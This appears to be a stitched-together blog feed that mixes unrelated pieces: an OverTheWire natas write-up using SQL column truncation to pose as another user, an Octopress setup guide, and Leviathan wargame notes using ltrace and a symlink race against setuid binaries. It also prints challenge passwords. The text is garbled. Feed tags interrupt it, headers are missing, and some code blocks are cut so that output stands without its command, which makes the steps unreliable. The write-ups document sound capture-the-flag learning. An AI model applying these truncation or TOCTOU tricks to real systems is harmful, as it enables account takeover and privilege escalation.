<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>validUser() 
</span><span class='line'>  if user exists, checkCredentials()
</span><span class='line'>      if yay here is your data
</span><span class='line'>      if nay wrong password message
</span><span class='line'>  else createUser()</span></code></pre></td></tr></table></div></figure>


<p>To confirm it, I used <a href="http://sqlfiddle.com/">sqlfiddle</a> to generate a database and queries that mimic the PHP code.</p>

<p>First, table creation:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="o">`</span><span class="n">users</span><span class="o">`</span> <span class="p">(</span>
</span><span class='line'>  <span class="o">`</span><span class="n">username</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="k">DEFAULT</span> <span class="k">NULL</span><span class="p">,</span>
</span><span class='line'>  <span class="o">`</span><span class="n">password</span><span class="o">`</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="k">DEFAULT</span> <span class="k">NULL</span>
</span><span class='line'><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Then, inserting the natas28 user with the password (I used a dummy one but assume it&rsquo;s the one we&rsquo;re after):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">users</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">&#39;natas28&#39;</span><span class="p">,</span><span class="s1">&#39;omgpass&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Next, the querying for the username as it happens in the validUser() function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="s1">&#39;natas28&#39;</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And the result:</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/sqlfiddle.png" title="sqlfiddle" alt="sqlfiddle"></p>

<p>When trying to insert the long string next I received a data truncation error because it was larger than the allowed 64 characters, so I manually adjusted it to natas28 + 57 spaces:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>'natas28                                                         '</span></code></pre></td></tr></table></div></figure>


<p>Then I added it to the table:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">users</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span> <span class="k">values</span> <span class="p">(</span><span class="s1">&#39;natas28                                                         &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>And when querying the database both are returned (with the first being the original natas28 user):</p>

<p><img class="center" src="http://chousensha.github.io/images/overthewire/natas/sqlfiddle2.png" title="sqlfiddle2" alt="sqlfiddle2"></p>

<p>To summarize:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># with input of 'natas28                                                                end'
</span><span class='line'>validUser() 
</span><span class='line'>  long string is truncated to natas28 end, which doesn't exist in the table
</span><span class='line'>createUser()
</span><span class='line'>  # input becomes 'natas28                                                         '
</span><span class='line'>  the value that is inserted in the table is truncated to the max length, in this case natas28 + 57 spaces
</span><span class='line'># now check again with username of natas28 and no password
</span><span class='line'>validUser() 
</span><span class='line'>  username already exists, so checkCredentials()
</span><span class='line'>  with the space trimming, the code returns both the original and my inserted username, as seen on sqlfiddle (but due to the PHP code, we only get the first row, which is fine, because that's the one we care about</span></code></pre></td></tr></table></div></figure>


<p>Password is <code>JWwR438wkgTsNKBbcJoowyysdM82YjeF</code></p>

<h3>Level 28</h3>

<p>And it&rsquo;s finished for now! Awesome challenge!</p>

    <updated>2015-11-26T11:16:32-05:00</updated>
    <id>http://chousensha.github.io/blog/2015/11/26/cloning-octopress-blog</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve recently had some problems with Octopress breaking on my old Kali 1.0 box. And since the Kali 1.0 reached its end of life, figured this might be a good time to jump ship and install the 2.0 version, and set up a fresh Octopress there. So in this post I will quickly overview the steps needed to clone an already existing Octopress blog on a new machine and resume blogging from there.</p>

<!-- more -->


<h4>clone the source branch repository</h4>

<p>git clone -b source <a href="https://github.com/chousensha/chousensha.github.io.git">https://github.com/chousensha/chousensha.github.io.git</a> octopress</p>

<p>cd octopress</p>

<h4>clone master branch to _deploy</h4>

<p>git clone <a href="https://github.com/chousensha/chousensha.github.io.git">https://github.com/chousensha/chousensha.github.io.git</a> _deploy</p>

<p>The <code>source</code> branch contains the source of your blog, while the content that you generate is in the <code>master</code> branch.</p>

<p>Before proceeding with installing dependencies, I followed the instructions on <a href="http://octopress.org/docs/setup/">http://octopress.org/docs/setup/</a> to install rvm, Ruby 1.9.3 and ExecJs:</p>

<h4>install rvm</h4>

<p>command curl -sSL <a href="https://rvm.io/mpapis.asc">https://rvm.io/mpapis.asc</a> | gpg2 &mdash;import &ndash;
curl -L <a href="https://get.rvm.io">https://get.rvm.io</a> | bash -s stable &mdash;ruby</p>

<h4>run below to be able to use rvm in the shell windows, and add it to your shell rc file or you will need to always run it before using rvm</h4>

<p>source /usr/local/rvm/scripts/rvm</p>

<h4>install Ruby 1.9.3</h4>

<p>rvm install 1.9.3</p>

<p>You will get a message that this version of Ruby is no longer maintained, but I had problems with Ruby 2~ so keeping this for Octopress.</p>

<h4>use Ruby 1.9.3</h4>

<p>rvm use 1.9.3</p>

<h4>update the rubygems to the latest available</h4>

<p>rvm rubygems latest</p>

<h4>optional: check that your Ruby version is the right one</h4>

<p>ruby &mdash;version</p>

<h4>install JS runtime for Ruby</h4>

<p>gem install execjs</p>

<h4>now install dependencies</h4>

<p>gem install bundler
bundle install</p>

<h4>setup github pages</h4>

<p>bundle exec rake setup_github_pages</p>

<p>And you&rsquo;re good to go!</p>

<p>Note for <em>zsh</em> users: because of the globbing of <em>zsh</em>, you will need to add <code>alias rake=&ldquo;noglob rake&rdquo;</code> to your .zshrc file or you will get a no matches found error. Or you can quote the arguments given to rake: <code>rake &ldquo;new_post[Whatever]&rdquo;</code></p>

<h3>Level 1 &ndash;> Level 2</h3>

<p>There is a setuid binary in the home folder that asks for a password. Running <em>strings</em> on it didn&rsquo;t reveal much, except that it uses <em>strcmp</em>..so it compares the input it receives with something..</p>

<p>I solved this by running <em>ltrace</em> on the binary. <em>ltrace</em> is a library call tracer:</p>

<blockquote><p>ltrace  is  a  program  that simply runs the specified command until it
exits.  It intercepts and records the dynamic library calls  which  are
called  by  the  executed process and the signals which are received by
 that process.  It can also intercept and print the  system  calls  executed by the program.</p></blockquote>

<p>In the <em>ltrace</em> output you can actually see the password that your input is compared with. Give it to the program and you will get a shell as leviathan2:</p>

<p>In this level we have another setuid binary named printfile. If you try to read the password file for the next level you just get a message that you an&rsquo;t have that file:</p>

<p>This is good news, because <em>access</em> is vulnerable to race conditions, as can be seen from its man page:</p>

<blockquote><p>access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.</p>

<p>The check is done using the calling process&rsquo;s real UID and GID,  rather than the effective IDs as is done when actually attempting an operation
(e.g., open(2)) on the file.  This allows set-user-ID programs to  easily determine the invoking user&rsquo;s authority.</p>

<p>Warning: Using access() to check if a user is authorized to, for  example, open a file before actually doing so using open(2) creates a security
hole, because the user  might  exploit  the  short  time  interval between  checking and opening the file to manipulate it. For this reason, the   > use of this system call should be avoided.</p></blockquote>

<p>A more detailed description from <a href="https://www.owasp.org/index.php/File_Access_Race_Condition:_TOCTOU">OWASP</a>:</p>

<blockquote><p>The window of time between when a file property is checked and when the file is used can be exploited to launch a privilege escalation attack.</p>

<p>File access race conditions, known as time-of-check, time-of-use (TOCTOU) race conditions, occur when:</p>

<p>The program checks a property of a file, referencing the file by name.
The program later performs a filesystem operation using the same filename and assumes that the previously-checked property still holds.</p></blockquote>

<p>The first thing I thought was to create a file and make it a symlink to the password file, but it didn&rsquo;t work. So I just made a random file for test purposes and used <em>ltrace</em> again to see what is happening when accessing it:</p>

<p>I have to say, I used help for this one, because it wasn&rsquo;t clear to me on how to proceed (it&rsquo;s also where I got stuck when I first attempted this wargame). If <em>access</em> returns successfully, it will <em>cat</em> the file that was passed to it (and it&rsquo;s actually <em>snprintf</em> that does the <em>cat</em>. Remember from Bandit how <em>cat</em> won&rsquo;t print files with spaces in their names, unless the spaces are escaped or the filename is surrounded by quotes. I made a new dummy file with a space in its name:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>

<p>Now I ran <em>ltrace</em> again and tried to print this new file:</p>

</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>


<p>There is a discrepancy between <em>access</em>, which checks the path of the file, and what <em>cat</em> tries to print, two different files that don&rsquo;t exist, <em>space</em> and <em>file</em> (because the space isn&rsquo;t seen as part of the filename, but as a separator between arguments):</p>

<ul>
<li><p><em>cat</em> tries /tmp/baka/space</p></li>
<li><p><em>cat</em> tries file</p></li>
</ul>


<p>This is where the symbolic link exploitation part comes in place. It didn&rsquo;t work before, but if I now create a symlink to the password file and name it <em>space</em>, it will match the first half of the file that <em>cat</em> will try to print:</p>

<p>Yay! It worked! Because <em>cat</em> first tried to print <em>space</em>, it followed the symlink with the same name and printed the password!</p>

<h3>Level 3 &ndash;> Level 4</h3>

<p>And another setuid binary! Running <em>strings</em> on it revealed it&rsquo;s a program that gives you a shell if you enter the right password. Along with string names such as do_stuff, nothing and morenothing xD</p>

<p>Convert it to Ascii for the password: <code>Tith4cokei</code></p>
